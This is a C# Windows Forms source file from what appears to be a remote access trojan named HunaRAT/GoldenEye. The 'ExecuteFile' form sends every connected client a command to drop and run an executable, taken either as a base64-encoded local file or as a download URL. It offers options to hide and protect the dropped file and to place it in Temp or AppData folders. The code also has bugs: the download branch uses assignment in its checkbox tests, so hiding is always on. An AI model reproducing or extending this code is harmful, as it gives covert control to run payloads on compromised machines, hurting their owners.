using GoldenEye_Remote_Administration_Tool;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace HunaRAT.Forms
{
    public partial class ExecuteFile : Form
    {
        public List<Connection> Clientlist = new List<Connection>();

        public ExecuteFile()
        {
            InitializeComponent();
        }

        private void ExecuteFile_Load(object sender, EventArgs e)
        {
            textBox2.Enabled = false;
        }

        private void checkRadioButtons()
        {
            if (radioButton1.Checked == true)
            {
                button1.Enabled = true;
                textBox1.Enabled = true;

                textBox2.Enabled = false;
            }
            else
            {
                textBox2.Enabled = true;

                button1.Enabled = false;
                textBox1.Enabled = false;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string mode;
            string filepath;
            string directDL;
            string dropAs;
            string dropFileTo;
            string hideFile = "0";
            string protectFile = "0";

            if (radioButton1.Checked == true)
            {
                mode = "LOCALFILE";
                goto Local;
            }
            else
            {
                mode = "URL";
                goto download;
            }

            Local:
            filepath = textBox1.Text;
            dropAs = textBox3.Text;
            if (checkBox1.Checked == true)
            {
                hideFile = "1";
            }
            if (checkBox2.Checked == true)
            {
                protectFile = "1";
            }
            if (radioButton4.Checked == true)
            {
                dropFileTo = "Temp Folder";
            }
            else if (radioButton5.Checked == true)
            {
                dropFileTo = "Programs Folder";
            }
            else if (radioButton6.Checked == true)
            {
                dropFileTo = "Appdata Local";
            }
            else if (radioButton7.Checked == true)
            {
                dropFileTo = "Appdata Roaming";
            }
            else
            {
                dropFileTo = "Temp Folder";
            }
            foreach (Connection clnt in Clientlist)
            {
                clnt.Send("FLEXEC|" + mode + "|" + Convert.ToBase64String(File.ReadAllBytes(filepath)) + "|" + dropAs + "|" + dropFileTo + "|" + hideFile + "|" + protectFile);
            }
            MessageBox.Show("Execution command has been sent!");
            return;

            download:
            directDL = textBox2.Text;
            dropAs = textBox3.Text;
            if (checkBox1.Checked = true)
            {
                hideFile = "1";
            }
            if (checkBox2.Checked = true)
            {
                protectFile = "1";
            }
            if (radioButton4.Checked == true)
            {
                dropFileTo = "Temp Folder";
            }
            else if (radioButton5.Checked == true)
            {
                dropFileTo = "Programs Folder";
            }
            else if (radioButton6.Checked == true)
            {
                dropFileTo = "Appdata Local";
            }
            else if (radioButton7.Checked == true)
            {
                dropFileTo = "Appdata Roaming";
            }
            else
            {
                dropFileTo = "Temp Folder";
            }

            foreach (Connection clnt in Clientlist)
            {
                clnt.Send("FLEXEC|" + mode + "|" + directDL + "|" + dropAs + "|" + dropFileTo + "|" + hideFile + "|" + protectFile);
            }
            if (Clientlist.Count > 1)
            {
                MessageBox.Show("Execution command has been sent to" + Clientlist.Count.ToString() + " Clients!");
                return;
            }
            MessageBox.Show("Execution command has been sent!");
            return;
        }

        private void radioButton1_CheckedChanged(object sender)
        {
            checkRadioButtons();
        }

        private void radioButton2_CheckedChanged(object sender)
        {
            checkRadioButtons();
        }

        private void themeContainer1_Click(object sender, EventArgs e)
        {
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog res = new OpenFileDialog();
            res.Filter = "Executable Files|*.exe";

            //When the user select the file
            if (res.ShowDialog() == DialogResult.OK)
            {
                //Get the file's path
                var filePath = res.FileName;
                textBox1.Text = filePath;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string mode;
            string filepath;
            string directDL;
            string dropAs;
            string dropFileTo;
            string hideFile = "0";
            string protectFile = "0";

            if (radioButton1.Checked == true)
            {
                mode = "LOCALFILE";
                goto Local;
            }
            else
            {
                mode = "URL";
                goto download;
            }

            Local:
            filepath = textBox1.Text;
            dropAs = textBox3.Text;
            if (checkBox1.Checked == true)
            {
                hideFile = "1";
            }
            if (checkBox2.Checked == true)
            {
                protectFile = "1";
            }
            if (radioButton4.Checked == true)
            {
                dropFileTo = "Temp Folder";
            }
            else if (radioButton5.Checked == true)
            {
                dropFileTo = "Programs Folder";
            }
            else if (radioButton6.Checked == true)
            {
                dropFileTo = "Appdata Local";
            }
            else if (radioButton7.Checked == true)
            {
                dropFileTo = "Appdata Roaming";
            }
            else
            {
                dropFileTo = "Temp Folder";
            }
            foreach (Connection clnt in Clientlist)
            {
                clnt.Send("FLEXEC|" + mode + "|" + Convert.ToBase64String(File.ReadAllBytes(filepath)) + "|" + dropAs + "|" + dropFileTo + "|" + hideFile + "|" + protectFile);
            }
            MessageBox.Show("Execution command has been sent!");
            return;

            download:
            directDL = textBox2.Text;
            dropAs = textBox3.Text;
            if (checkBox1.Checked = true)
            {
                hideFile = "1";
            }
            if (checkBox2.Checked = true)
            {
                protectFile = "1";
            }
            if (radioButton4.Checked == true)
            {
                dropFileTo = "Temp Folder";
            }
            else if (radioButton5.Checked == true)
            {
                dropFileTo = "Programs Folder";
            }
            else if (radioButton6.Checked == true)
            {
                dropFileTo = "Appdata Local";
            }
            else if (radioButton7.Checked == true)
            {
                dropFileTo = "Appdata Roaming";
            }
            else
            {
                dropFileTo = "Temp Folder";
            }

            foreach (Connection clnt in Clientlist)
            {
                clnt.Send("FLEXEC|" + mode + "|" + directDL + "|" + dropAs + "|" + dropFileTo + "|" + hideFile + "|" + protectFile);
            }
            if (Clientlist.Count > 1)
            {
                MessageBox.Show("Execution command has been sent to" + Clientlist.Count.ToString() + " Clients!");
                return;
            }
            MessageBox.Show("Execution command has been sent!");
            return;
        }
    }
}